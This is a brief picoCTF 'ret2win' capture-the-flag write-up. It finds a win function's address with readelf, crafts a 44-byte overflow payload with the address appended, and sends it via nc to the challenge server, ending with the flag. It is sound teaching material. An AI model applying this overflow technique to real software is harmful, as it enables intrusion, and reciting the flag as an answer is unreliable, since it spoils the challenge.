# Objective is a "RET2WIN".

##### Locate "WIN"-function address:
└─$ readelf -s vuln | grep win
    63: 080491f6   139 FUNC    GLOBAL DEFAULT   13 win

### Create payload to jump to win fnc:
└─$ python2 -c "print('A' * 44 + '\xf6\x91\x04\x08')" > payload

### final payload:
└─$ nc saturn.picoctf.net 57667 < payload
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_0195a40f}